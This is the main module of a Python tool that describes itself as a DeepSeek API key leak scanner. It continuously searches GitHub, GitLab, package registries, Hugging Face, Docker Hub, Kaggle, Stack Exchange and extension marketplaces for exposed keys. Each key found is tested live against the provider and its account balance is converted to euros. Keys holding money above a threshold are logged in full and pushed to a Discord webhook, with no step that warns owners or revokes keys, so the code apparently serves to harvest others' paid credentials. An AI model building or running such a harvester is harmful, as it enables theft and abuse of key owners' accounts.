import argparse
import asyncio
import fcntl
import glob
import logging
from logging.handlers import RotatingFileHandler
import os
import re
import shutil
import signal
import sys
import time
import tomllib

import httpx
from rich.live import Live

from scanner.clone_engine import CloneEngine
from scanner.dockerhub_engine import DockerHubEngine
from scanner.events_engine import EventsEngine
from scanner.fx import CurrencyConverter
from scanner.gh_search_engine import CommitSearchEngine, RepoSearchEngine
from scanner.gharchive import GHArchiveEngine
from scanner.gist_engine import GistEngine
from scanner.gitlab_engine import GitlabEngine
from scanner.gitlab_events_engine import GitlabEventsEngine
from scanner.grep_engine import GrepEngine
from scanner.hf_engine import HFEngine
from scanner.issue_search_engine import IssueSearchEngine
from scanner.kaggle_engine import KaggleEngine
from scanner.npm_engine import NpmEngine
from scanner.openvsx_engine import OpenVSXEngine
from scanner.notifier import Notifier
from scanner.pypi_engine import PypiEngine
from scanner.ratelimit import TokenBucket
from scanner.search_engine import SearchEngine, build_query_list
from scanner.stackexchange_engine import StackExchangeEngine
from scanner.storage import Store
from scanner.tokens import TokenPool
from scanner.ui import Stats, StatsLogHandler, render
from scanner.urlscan_engine import UrlscanEngine
from scanner.vscode_marketplace_engine import VSCodeMarketplaceEngine
from scanner.validator import Validator

log = logging.getLogger("scanner.main")

HOT_SOURCES = {"events", "gists", "clone", "gharchive", "npm", "pypi",
               "gitlab-events", "commit-search", "issue-search", "huggingface"}


def load_config(path: str) -> dict:
    with open(path, "rb") as fh:
        cfg = tomllib.load(fh)

    pattern = cfg.get("key_regex", r"sk-[a-f0-9]{32}\b")
    try:
        re.compile(pattern)
    except re.error as exc:
        log.error("invalid key_regex %r: %s", pattern, exc)
        sys.exit(1)

    tokens = cfg.get("github_tokens") or [cfg.get("github_token", "")]
    tokens = [t for t in tokens if t]
    if not tokens:
        log.warning("no github tokens configured: search API requires auth and core limits drop to 60/hr")
    if not cfg.get("discord_webhook_url"):
        log.warning("discord_webhook_url is empty: valid keys will be logged but not notified")
    return cfg


async def check_tokens(tokens: list[str], client: httpx.AsyncClient):
    for token in tokens:
        try:
            resp = await client.get(
                "https://api.github.com/rate_limit",
                headers={"User-Agent": "deepseek-scanner",
                         "Authorization": f"Bearer {token}"},
                timeout=15.0,
            )
            if resp.status_code == 200:
                res = resp.json().get("resources", {})
                core = res.get("core", {})
                search = res.get("search", {})
                log.info("token %s…: core %s/%s, search %s/%s",
                         token[:10], core.get("remaining"), core.get("limit"),
                         search.get("remaining"), search.get("limit"))
            else:
                log.warning("token %s… health check HTTP %d", token[:10], resp.status_code)
        except httpx.HTTPError as exc:
            log.warning("token %s… health check failed: %s", token[:10], exc)


async def validation_loop(hot: asyncio.Queue, cold: asyncio.Queue,
                          validator: Validator, store: Store, stats: Stats,
                          fx: CurrencyConverter, min_balance_eur: float,
                          notify_queue: asyncio.Queue, active: set,
                          notify_all_valid: bool = False):
    hot_get = asyncio.create_task(hot.get())
    cold_get = asyncio.create_task(cold.get())
    try:
        while True:
            done, _ = await asyncio.wait({hot_get, cold_get},
                                         return_when=asyncio.FIRST_COMPLETED)
            if hot_get in done:
                queue = hot
                cand = hot_get.result()
                hot_get = asyncio.create_task(hot.get())
            else:
                queue = cold
                cand = cold_get.result()
                cold_get = asyncio.create_task(cold.get())
            try:
                result, balances = await validator.check(cand["key"])
                if result == "retry":
                    log.info("validation deferred (transient error), will retry later: %s",
                             cand["repo"])
                    continue
                if result == "invalid":
                    store.mark_validated(cand["key_hash"], "invalid", None)
                    stats.invalid += 1
                    continue

                eur = None
                if balances:
                    await fx.ensure()
                    converted = [fx.to_eur(amount, cur) for amount, cur in balances]
                    known = [v for v in converted if v is not None]
                    if len(known) == len(balances):
                        eur = sum(known)

                label = f"€{eur:.2f}" if eur is not None else None

                if eur is None:
                    meets_threshold = False
                elif notify_all_valid:
                    meets_threshold = True
                elif min_balance_eur > 0:
                    meets_threshold = eur >= min_balance_eur
                else:
                    meets_threshold = eur > 0

                if meets_threshold:
                    stats.valid += 1
                    stats.recent.append((cand["repo"], f"{label} EUR", "valid"))
                    if notify_all_valid:
                        reason = "notify-all"
                    elif min_balance_eur > 0:
                        reason = f">={min_balance_eur:.2f} EUR"
                    else:
                        reason = "balance>0"
                    log.warning("VALID KEY (%s): %s in %s (balance=%s)",
                                reason, cand["key"], cand["repo"], label)
                    store.mark_validated(cand["key_hash"], "valid", label)
                    await notify_queue.put({**cand, "balance_eur": label})
                else:
                    stats.skipped += 1
                    stats.recent.append((cand["repo"], f"{label} EUR", "below threshold"))
                    log.info("below threshold (%s): %s %s in %s",
                             f">={min_balance_eur:.2f} EUR" if min_balance_eur > 0
                             else "balance>0", cand["key"][:10] + "...", cand["repo"],
                             f"balance={label}")
                    store.mark_validated(cand["key_hash"], "below_threshold", label)
            except Exception:
                log.exception("validation failed for candidate %s", cand["key_hash"])
            finally:
                queue.task_done()
                active.discard(cand["key_hash"])
    except asyncio.CancelledError:
        hot_get.cancel()
        cold_get.cancel()
        raise


async def requeue_loop(store: Store, hot: asyncio.Queue, cold: asyncio.Queue,
                       active: set, interval: int = 600, revalidate_hours: int = 48):
    while True:
        await asyncio.sleep(interval)
        pending = (store.pending_candidates()
                   + store.stale_below_threshold(revalidate_hours)
                   + store.stale_valid_unnotified(1))
        for cand in pending:
            if cand["key_hash"] in active:
                continue
            active.add(cand["key_hash"])
            target = hot if cand.get("source") in HOT_SOURCES else cold
            await target.put(cand)


async def notify_worker(queue: asyncio.Queue, notifier: Notifier, store: Store,
                        stats: Stats):
    while True:
        first = await queue.get()
        try:
            if first is None:
                return
            batch = [first]
            stop = False
            loop = asyncio.get_running_loop()
            deadline = loop.time() + 2.0
            while not stop:
                remaining = deadline - loop.time()
                if remaining <= 0:
                    break
                try:
                    nxt = await asyncio.wait_for(queue.get(), timeout=remaining)
                except asyncio.TimeoutError:
                    break
                if nxt is None:
                    stop = True
                    break
                batch.append(nxt)

            by_repo: dict[str, list[dict]] = {}
            for item in batch:
                by_repo.setdefault(item["repo"], []).append(item)

            for repo, items in by_repo.items():
                ok = await notifier.notify_many(items)
                for item in items:
                    if not ok:
                        log.warning("webhook delivery failed for %s, status kept as valid", repo)
                        break
                    try:
                        store.mark_notified(item["key_hash"])
                        stats.notified += 1
                        stats.recent.append((repo, f"{item.get('balance_eur', '?')} EUR",
                                             "notified"))
                    except Exception:
                        log.exception("failed to mark notified for %s", item["key_hash"])
            if stop:
                return
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("notify worker failed")


async def heartbeat_loop(stats: Stats, hot: asyncio.Queue, cold: asyncio.Queue,
                         interval: int = 300):
    while True:
        await asyncio.sleep(interval)
        uptime_min = max(0, int(time.time() - stats.started_at)) // 60
        log.info("alive: uptime=%dm | candidates=%d valid=%d invalid=%d "
                 "skipped=%d notified=%d errors=%d | queue hot=%d cold=%d",
                 uptime_min, stats.candidates, stats.valid, stats.invalid,
                 stats.skipped, stats.notified, stats.errors,
                 hot.qsize(), cold.qsize())


async def tui_refresh(live: Live, stats: Stats):
    while True:
        try:
            live.update(render(stats), refresh=True)
        except Exception:
            log.debug("tui refresh failed", exc_info=True)
        await asyncio.sleep(0.25)


async def _supervised(fn, name: str):
    while True:
        try:
            await fn()
            return
        except asyncio.CancelledError:
            raise
        except Exception:
            log.exception("engine %s crashed, restarting in 60s", name)
            await asyncio.sleep(60)


def spawn(fn, name: str) -> asyncio.Task:
    return asyncio.create_task(_supervised(fn, name), name=name)


async def run(cfg: dict, once: bool, no_tui: bool, stats: Stats,
              fast: bool = False, backfill: int | None = None):
    loop = asyncio.get_running_loop()

    def _loop_exc_handler(_loop, context):
        exc = context.get("exception")
        if exc is not None:
            log.error("unhandled task exception",
                      exc_info=(type(exc), exc, exc.__traceback__))
        else:
            log.error("asyncio error: %s", context.get("message"))

    loop.set_exception_handler(_loop_exc_handler)

    pattern = re.compile(cfg["key_regex"])
    store = Store()
    hot: asyncio.Queue = asyncio.Queue()
    cold: asyncio.Queue = asyncio.Queue()
    notify_queue: asyncio.Queue = asyncio.Queue()
    active: set = set()

    search_cfg = cfg.get("search", {})
    if fast:
        search_cfg = dict(search_cfg)
        search_cfg["queries"] = list(search_cfg.get("queries", []))[:15]
        search_cfg["max_pages_per_query"] = 3
        for key in ("extensions", "extension_terms", "languages", "language_terms",
                    "size_terms", "size_buckets"):
            search_cfg[key] = []
    events_cfg = cfg.get("events", {})
    gists_cfg = cfg.get("gists", {})
    limits = cfg.get("limits", {})
    fx_cfg = cfg.get("fx", {})
    filters_cfg = cfg.get("filters", {})
    grep_cfg = cfg.get("grepapp", {})
    clone_cfg = cfg.get("clone", {})
    gharchive_cfg = cfg.get("gharchive", {})
    urlscan_cfg = cfg.get("urlscan", {})
    gitlab_cfg = cfg.get("gitlab", {})
    npm_cfg = cfg.get("npm", {})
    pypi_cfg = cfg.get("pypi", {})
    commit_cfg = cfg.get("commit_search", {})
    repo_cfg = cfg.get("repo_search", {})
    issue_cfg = cfg.get("issue_search", {})
    hf_cfg = cfg.get("huggingface", {})
    stack_cfg = cfg.get("stackexchange", {})
    docker_cfg = cfg.get("dockerhub", {})
    kaggle_cfg = cfg.get("kaggle", {})
    openvsx_cfg = cfg.get("openvsx", {})
    vscode_cfg = cfg.get("vscode_marketplace", {})
    deny = frozenset(filters_cfg.get("denylist", []))

    token_list = cfg.get("github_tokens") or [cfg.get("github_token", "")]
    token_list = [t for t in token_list if t]
    if not token_list:
        token_list = [""]

    search_pool = TokenPool(token_list,
                            rate=limits.get("search_per_minute", 10) / 60.0,
                            capacity=1)
    core_pool = TokenPool(token_list,
                          rate=limits.get("core_per_hour", 4500) / 3600.0,
                          capacity=100)
    patch_bucket = TokenBucket(
        rate=events_cfg.get("patch_per_minute", 120) / 60.0,
        capacity=events_cfg.get("patch_per_minute", 120),
    )
    gharchive_bucket = TokenBucket(
        rate=gharchive_cfg.get("patch_per_minute", 100) / 60.0,
        capacity=gharchive_cfg.get("patch_per_minute", 100),
    )
    gh_search_pool = TokenPool(token_list,
                               rate=limits.get("gh_search_per_minute", 30) / 60.0,
                               capacity=2)
    gh_search_patch_bucket = TokenBucket(rate=2.0, capacity=120)

    watch_content_re = None
    if clone_cfg.get("enabled", True):
        strong = clone_cfg.get("strong_content_regex",
                               r"(?i)(DEEPSEEK_API_KEY|api\.deepseek\.com)")
        try:
            watch_content_re = re.compile(strong)
        except re.error as exc:
            log.warning("invalid clone strong_content_regex: %s", exc)

    headers = {"User-Agent": "deepseek-scanner"}
    http_limits = httpx.Limits(max_connections=200, max_keepalive_connections=50)
    async with httpx.AsyncClient(headers=headers, limits=http_limits,
                                 http2=True) as client:
        if token_list != [""]:
            await check_tokens(token_list, client)

        search_engine = SearchEngine(
            client=client,
            tokens=search_pool,
            queries=build_query_list(search_cfg),
            pattern=pattern,
            store=store,
            candidates=cold,
            sweep_interval=search_cfg.get("sweep_interval_seconds", 3600),
            raw_concurrency=limits.get("raw_fetch_concurrency", 30),
            stats=stats,
            deny=deny,
            alternate_indexed_sort=search_cfg.get("alternate_indexed_sort", True),
            watch_content_re=watch_content_re,
            watchlist_max=clone_cfg.get("max_watchlist", 20000),
        )
        events_engine = EventsEngine(
            client=client,
            tokens=core_pool,
            pattern=pattern,
            store=store,
            candidates=hot,
            poll_interval=events_cfg.get("poll_interval_seconds", 30),
            max_shas=events_cfg.get("max_processed_shas", 100000),
            pages=events_cfg.get("pages", 3),
            patch_bucket=patch_bucket,
            stats=stats,
            deny=deny,
        )
        gist_engine = GistEngine(
            client=client,
            tokens=core_pool,
            pattern=pattern,
            store=store,
            candidates=hot,
            poll_interval=gists_cfg.get("poll_interval_seconds", 60),
            pages=gists_cfg.get("pages", 2),
            stats=stats,
            deny=deny,
            raw_concurrency=limits.get("raw_fetch_concurrency", 30),
        )
        clone_engine = CloneEngine(
            store=store,
            pattern=pattern,
            candidates=hot,
            stats=stats,
            deny=deny,
            max_concurrent=clone_cfg.get("max_concurrent", 2),
            max_repo_size_mb=clone_cfg.get("max_repo_size_mb", 500),
            rescan_days=clone_cfg.get("rescan_days", 7),
        )
        gharchive_engine = None
        if gharchive_cfg.get("enabled", False):
            gharchive_engine = GHArchiveEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=hot,
                patch_bucket=gharchive_bucket,
                stats=stats,
                deny=deny,
                signal_terms=gharchive_cfg.get("signal_terms"),
                backfill_days=0 if fast else gharchive_cfg.get("backfill_days", 7),
                concurrency=gharchive_cfg.get("concurrency", 5),
            )
        grep_engine = None
        grep_queries = [(q.get("q"), q.get("regexp", False))
                        for q in grep_cfg.get("queries", [])]
        if grep_cfg.get("enabled", False) and grep_queries:
            grep_engine = GrepEngine(
                client=client,
                queries=grep_queries,
                pattern=pattern,
                store=store,
                candidates=cold,
                interval_seconds=grep_cfg.get("interval_seconds", 7200),
                requests_per_minute=grep_cfg.get("requests_per_minute", 6),
                stats=stats,
                deny=deny,
            )
        urlscan_engine = None
        if urlscan_cfg.get("enabled", False):
            urlscan_engine = UrlscanEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                stats=stats,
                deny=deny,
                api_key=urlscan_cfg.get("api_key", ""),
                interval_seconds=urlscan_cfg.get("interval_seconds", 21600),
            )
        gitlab_engine = None
        if gitlab_cfg.get("enabled", False) and gitlab_cfg.get("token"):
            gitlab_engine = GitlabEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                stats=stats,
                deny=deny,
                token=gitlab_cfg["token"],
                host=gitlab_cfg.get("host", "https://gitlab.com"),
                interval_seconds=gitlab_cfg.get("interval_seconds", 7200),
            )
        npm_engine = None
        if npm_cfg.get("enabled", True):
            npm_engine = NpmEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=hot,
                stats=stats,
                deny=deny,
                poll_interval=npm_cfg.get("poll_interval_seconds", 60),
                limit=npm_cfg.get("limit_per_poll", 200),
                scan_terms=npm_cfg.get("scan_terms"),
                max_size_kb=npm_cfg.get("max_size_kb", 300),
                max_size_kb_term=npm_cfg.get("max_size_kb_term", 5000),
                max_download_kb=npm_cfg.get("max_download_kb", 25000),
            )
        pypi_engine = None
        if pypi_cfg.get("enabled", True):
            pypi_engine = PypiEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=hot,
                stats=stats,
                deny=deny,
                poll_interval=pypi_cfg.get("poll_interval_seconds", 120),
                scan_terms=pypi_cfg.get("scan_terms"),
                max_size_kb=pypi_cfg.get("max_size_kb", 300),
                max_size_kb_term=pypi_cfg.get("max_size_kb_term", 5000),
                max_download_kb=pypi_cfg.get("max_download_kb", 25000),
            )
        gitlab_events_engine = None
        if gitlab_cfg.get("events_enabled", False) and gitlab_cfg.get("token"):
            gitlab_events_engine = GitlabEventsEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=hot,
                stats=stats,
                deny=deny,
                token=gitlab_cfg["token"],
                host=gitlab_cfg.get("host", "https://gitlab.com"),
                poll_interval=gitlab_cfg.get("events_poll_interval_seconds", 60),
            )
        commit_search_engine = None
        if commit_cfg.get("enabled", True) and commit_cfg.get("queries"):
            commit_search_engine = CommitSearchEngine(
                client=client,
                tokens=gh_search_pool,
                store=store,
                candidates=hot,
                patch_bucket=gh_search_patch_bucket,
                pattern=pattern,
                queries=commit_cfg.get("queries", []),
                generic_queries=commit_cfg.get("generic_queries"),
                lookback_days=commit_cfg.get("lookback_days", 30),
                pages=commit_cfg.get("pages", 3),
                generic_pages=commit_cfg.get("generic_pages", 3),
                interval_seconds=commit_cfg.get("interval_seconds", 900),
                stats=stats,
                deny=deny,
            )
        repo_search_engine = None
        if repo_cfg.get("enabled", True) and repo_cfg.get("queries"):
            repo_search_engine = RepoSearchEngine(
                client=client,
                tokens=gh_search_pool,
                store=store,
                queries=repo_cfg.get("queries", []),
                lookback_days=repo_cfg.get("lookback_days", 90),
                pages=repo_cfg.get("pages", 2),
                interval_seconds=repo_cfg.get("interval_seconds", 3600),
                stats=stats,
                watchlist_max=clone_cfg.get("max_watchlist", 20000),
            )
        issue_search_engine = None
        if issue_cfg.get("enabled", True) and issue_cfg.get("queries"):
            issue_search_engine = IssueSearchEngine(
                client=client,
                search_tokens=gh_search_pool,
                core_tokens=core_pool,
                store=store,
                candidates=hot,
                pattern=pattern,
                queries=issue_cfg.get("queries"),
                pages=issue_cfg.get("pages", 2),
                lookback_days=issue_cfg.get("lookback_days", 30),
                interval_seconds=issue_cfg.get("interval_seconds", 1800),
                max_comment_fetches=issue_cfg.get("max_comment_fetches", 30),
                stats=stats,
                deny=deny,
            )
        hf_engine = None
        if hf_cfg.get("enabled", True) and hf_cfg.get("queries"):
            hf_engine = HFEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=hot,
                queries=hf_cfg.get("queries"),
                max_pages=hf_cfg.get("max_pages", 3),
                interval_seconds=hf_cfg.get("interval_seconds", 3600),
                stats=stats,
                deny=deny,
                token=hf_cfg.get("token", ""),
            )
        stack_engine = None
        if stack_cfg.get("enabled", True) and stack_cfg.get("queries"):
            stack_engine = StackExchangeEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                queries=stack_cfg.get("queries"),
                sites=stack_cfg.get("sites"),
                interval_seconds=stack_cfg.get("interval_seconds", 21600),
                api_key=stack_cfg.get("api_key", ""),
                stats=stats,
                deny=deny,
            )
        docker_engine = None
        if docker_cfg.get("enabled", True) and docker_cfg.get("queries"):
            docker_engine = DockerHubEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                queries=docker_cfg.get("queries"),
                max_images=docker_cfg.get("max_images", 30),
                max_tags=docker_cfg.get("max_tags", 4),
                interval_seconds=docker_cfg.get("interval_seconds", 86400),
                stats=stats,
                deny=deny,
            )
        kaggle_engine = None
        if kaggle_cfg.get("enabled", True) and kaggle_cfg.get("queries"):
            kaggle_engine = KaggleEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                queries=kaggle_cfg.get("queries"),
                max_datasets=kaggle_cfg.get("max_datasets", 30),
                username=kaggle_cfg.get("username", ""),
                key=kaggle_cfg.get("key", ""),
                notebooks=kaggle_cfg.get("notebooks", True),
                max_notebooks=kaggle_cfg.get("max_notebooks", 30),
                max_download_kb=kaggle_cfg.get("max_download_kb", 25000),
                interval_seconds=kaggle_cfg.get("interval_seconds", 43200),
                stats=stats,
                deny=deny,
            )
        openvsx_engine = None
        if openvsx_cfg.get("enabled", True) and openvsx_cfg.get("queries"):
            openvsx_engine = OpenVSXEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                queries=openvsx_cfg.get("queries"),
                max_extensions=openvsx_cfg.get("max_extensions", 30),
                max_download_kb=openvsx_cfg.get("max_download_kb", 25000),
                interval_seconds=openvsx_cfg.get("interval_seconds", 43200),
                stats=stats,
                deny=deny,
            )
        vscode_engine = None
        if vscode_cfg.get("enabled", True) and vscode_cfg.get("queries"):
            vscode_engine = VSCodeMarketplaceEngine(
                client=client,
                pattern=pattern,
                store=store,
                candidates=cold,
                queries=vscode_cfg.get("queries"),
                pages=vscode_cfg.get("pages", 2),
                page_size=vscode_cfg.get("page_size", 100),
                max_extensions=vscode_cfg.get("max_extensions", 30),
                max_download_kb=vscode_cfg.get("max_download_kb", 25000),
                interval_seconds=vscode_cfg.get("interval_seconds", 43200),
                stats=stats,
                deny=deny,
            )

        validator = Validator(
            client=client,
            concurrency=limits.get("validation_concurrency", 20),
        )
        notifier = Notifier(client=client, webhook_url=cfg.get("discord_webhook_url", ""))
        fx = CurrencyConverter(
            client=client,
            api_url=fx_cfg.get("api_url", "https://open.er-api.com/v6/latest/USD"),
            ttl_seconds=fx_cfg.get("ttl_seconds", 21600),
        )
        min_balance_eur = float(cfg.get("min_balance_eur", 3.0))

        await fx.ensure()

        for pending in store.pending_candidates():
            active.add(pending["key_hash"])
            target = hot if pending["source"] in HOT_SOURCES else cold
            target.put_nowait(pending)

        val_task = asyncio.create_task(
            validation_loop(hot, cold, validator, store, stats, fx,
                            min_balance_eur, notify_queue, active,
                            notify_all_valid=cfg.get("notify_all_valid", False)),
            name="validation")
        notify_task = asyncio.create_task(
            notify_worker(notify_queue, notifier, store, stats), name="notify")

        live = None
        tui_task = None
        if not no_tui:
            live = Live(render(stats), auto_refresh=False, screen=False)
            live.start()
            tui_task = asyncio.create_task(tui_refresh(live, stats))

        try:
            if once:
                log.info("running one pass over all sources (--once mode)")
                await search_engine.sweep()
                await events_engine.poll_once()
                await gist_engine.poll_once()
                if gharchive_engine is not None:
                    if backfill:
                        await gharchive_engine.backfill(backfill)
                    else:
                        await gharchive_engine.process_latest()
                if grep_engine is not None:
                    await grep_engine.sweep()
                if urlscan_engine is not None:
                    await urlscan_engine.sweep()
                if gitlab_engine is not None:
                    await gitlab_engine.sweep()
                if npm_engine is not None:
                    await npm_engine.poll()
                if pypi_engine is not None:
                    await pypi_engine.poll()
                if gitlab_events_engine is not None:
                    await gitlab_events_engine.poll()
                if commit_search_engine is not None:
                    await commit_search_engine.sweep()
                if repo_search_engine is not None:
                    await repo_search_engine.sweep()
                if issue_search_engine is not None:
                    await issue_search_engine.sweep()
                if hf_engine is not None:
                    await hf_engine.sweep()
                if stack_engine is not None:
                    await stack_engine.sweep()
                if docker_engine is not None:
                    await docker_engine.sweep()
                if kaggle_engine is not None:
                    await kaggle_engine.sweep()
                if openvsx_engine is not None:
                    await openvsx_engine.sweep()
                if vscode_engine is not None:
                    await vscode_engine.sweep()
                await clone_engine.cycle()
                await hot.join()
                await cold.join()
                val_task.cancel()
                await asyncio.gather(val_task, return_exceptions=True)
                await notify_queue.put(None)
                await notify_task
                return

            search_task = spawn(lambda: search_engine.run(once=False), "search")
            events_task = spawn(events_engine.run, "events")
            gists_task = spawn(gist_engine.run, "gists")
            clone_task = spawn(clone_engine.run, "clone") if clone_engine.enabled else None
            requeue_task = spawn(
                lambda: requeue_loop(store, hot, cold, active,
                                     revalidate_hours=cfg.get("revalidate_below_threshold_hours", 48)),
                "requeue")
            heartbeat_task = spawn(lambda: heartbeat_loop(stats, hot, cold),
                                   "heartbeat")
            log.info("daemon mode: continuous scanning until Ctrl+C (heartbeat every 5m)")
            extra_tasks = [search_task, events_task, gists_task, requeue_task,
                           heartbeat_task]
            if clone_task is not None:
                extra_tasks.append(clone_task)
            if gharchive_engine is not None:
                extra_tasks.append(spawn(gharchive_engine.run, "gharchive"))
            if grep_engine is not None:
                extra_tasks.append(spawn(grep_engine.run, "grep"))
            if urlscan_engine is not None:
                extra_tasks.append(spawn(urlscan_engine.run, "urlscan"))
            if gitlab_engine is not None:
                extra_tasks.append(spawn(gitlab_engine.run, "gitlab"))
            if npm_engine is not None:
                extra_tasks.append(spawn(npm_engine.run, "npm"))
            if pypi_engine is not None:
                extra_tasks.append(spawn(pypi_engine.run, "pypi"))
            if gitlab_events_engine is not None:
                extra_tasks.append(spawn(gitlab_events_engine.run, "gitlab-events"))
            if commit_search_engine is not None:
                extra_tasks.append(spawn(commit_search_engine.run, "commit-search"))
            if repo_search_engine is not None:
                extra_tasks.append(spawn(repo_search_engine.run, "repo-search"))
            if issue_search_engine is not None:
                extra_tasks.append(spawn(issue_search_engine.run, "issue-search"))
            if hf_engine is not None:
                extra_tasks.append(spawn(hf_engine.run, "huggingface"))
            if stack_engine is not None:
                extra_tasks.append(spawn(stack_engine.run, "stackexchange"))
            if docker_engine is not None:
                extra_tasks.append(spawn(docker_engine.run, "dockerhub"))
            if kaggle_engine is not None:
                extra_tasks.append(spawn(kaggle_engine.run, "kaggle"))
            if openvsx_engine is not None:
                extra_tasks.append(spawn(openvsx_engine.run, "openvsx"))
            if vscode_engine is not None:
                extra_tasks.append(spawn(vscode_engine.run, "vscode"))

            stop = asyncio.Event()
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    loop.add_signal_handler(sig, stop.set)
                except NotImplementedError:
                    pass

            await stop.wait()
            log.info("shutting down...")
            for task in extra_tasks:
                task.cancel()
            val_task.cancel()
            await asyncio.gather(*extra_tasks, val_task, return_exceptions=True)
            await notify_queue.put(None)
            await notify_task
        finally:
            if tui_task is not None:
                tui_task.cancel()
                await asyncio.gather(tui_task, return_exceptions=True)
            if live is not None:
                live.stop()

    store.close()


class ErrorCounter(logging.Filter):
    def __init__(self, stats: Stats):
        super().__init__()
        self.stats = stats

    def filter(self, record: logging.LogRecord) -> bool:
        if record.levelno >= logging.ERROR:
            self.stats.errors += 1
        return True


def setup_logging(args, stats: Stats):
    level = logging.DEBUG if args.verbose else logging.INFO
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s")
    root = logging.getLogger()
    root.handlers.clear()
    root.setLevel(level)

    main_handler = RotatingFileHandler("scanner.log", maxBytes=10_000_000,
                                       backupCount=3, encoding="utf-8")
    main_handler.setFormatter(fmt)
    root.addHandler(main_handler)

    err_handler = RotatingFileHandler("errors.log", maxBytes=10_000_000,
                                      backupCount=3, encoding="utf-8")
    err_handler.setLevel(logging.ERROR)
    err_handler.setFormatter(fmt)
    root.addHandler(err_handler)

    root.addFilter(ErrorCounter(stats))
    logging.getLogger("httpx").setLevel(logging.WARNING)

    if args.no_tui or not sys.stdout.isatty():
        logging.getLogger().addHandler(logging.StreamHandler())
    else:
        logging.getLogger().addHandler(StatsLogHandler(stats))


def print_stats():
    store = Store()
    try:
        print("Findings by status:")
        for status, count in store.conn.execute(
                "SELECT status, COUNT(*) FROM findings GROUP BY status ORDER BY 2 DESC"):
            print(f"  {status:20s} {count}")
        print("Findings by source:")
        for source, count in store.conn.execute(
                "SELECT source, COUNT(*) FROM findings GROUP BY source ORDER BY 2 DESC"):
            print(f"  {source:20s} {count}")
        print("Recent valid / notified keys:")
        rows = store.conn.execute(
            "SELECT status, balance, key, repo, found_at FROM findings"
            " WHERE status IN ('valid', 'notified')"
            " ORDER BY validated_at DESC LIMIT 10").fetchall()
        if not rows:
            print("  (none)")
        for status, balance, key, repo, found in rows:
            masked = key[:10] + "..." + key[-4:] if len(key) > 16 else key
            print(f"  {status:10s} {balance or '-':10s} {masked:22s} {repo}"
                  f"  ({found})")
        watch = store.conn.execute("SELECT COUNT(*) FROM watchlist").fetchone()[0]
        pending = store.conn.execute(
            "SELECT COUNT(*) FROM watchlist WHERE last_scanned IS NULL").fetchone()[0]
        print(f"Clone watchlist: {watch} repos ({pending} not yet scanned)")
    finally:
        store.close()


def cleanup_stale_temp(max_age_hours: int = 6) -> int:
    cutoff = time.time() - max_age_hours * 3600
    removed = 0
    patterns = ("/tmp/clone-*", "/tmp/tmp*.vsix", "/tmp/tmp*.tgz",
                "/tmp/tmp*.pkg", "/tmp/tmp*.json.gz", "/tmp/tmp*.zip")
    for pattern in patterns:
        for path in glob.glob(pattern):
            try:
                if os.path.getmtime(path) > cutoff:
                    continue
                if os.path.isdir(path):
                    shutil.rmtree(path, ignore_errors=True)
                else:
                    os.unlink(path)
                removed += 1
            except OSError:
                pass
    return removed


def acquire_single_instance_lock():
    lock_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "scanner.lock")
    handle = open(lock_path, "w")
    try:
        fcntl.flock(handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        handle.close()
        return None
    handle.write(str(os.getpid()))
    handle.flush()
    return handle


def main():
    parser = argparse.ArgumentParser(description="DeepSeek API key leak scanner")
    parser.add_argument("--config", default="config.toml")
    parser.add_argument("--once", action="store_true",
                        help="run one search sweep (plus one events poll) and exit")
    parser.add_argument("--fast", action="store_true",
                        help="reduced sweep for quick runs (15 queries x 3 pages)")
    parser.add_argument("--backfill", type=int, default=None,
                        help="with --once: backfill N days of GH Archive")
    parser.add_argument("--stats", action="store_true",
                        help="print findings summary from the database and exit")
    parser.add_argument("--no-tui", action="store_true",
                        help="disable the live terminal UI (plain logs only)")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    if args.stats:
        print_stats()
        return

    stats = Stats()
    setup_logging(args, stats)

    lock = acquire_single_instance_lock()
    if lock is None:
        log.error("another scanner instance is already running (scanner.lock "
                  "is held); exiting. Check the background service with "
                  "'systemctl --user status deepseek-scanner'.")
        sys.exit(1)

    removed = cleanup_stale_temp()
    if removed:
        log.info("cleaned up %d stale temp files/dirs from /tmp", removed)

    cfg = load_config(args.config)
    asyncio.run(run(cfg, args.once, args.no_tui, stats,
                    fast=args.fast, backfill=args.backfill))


if __name__ == "__main__":
    main()
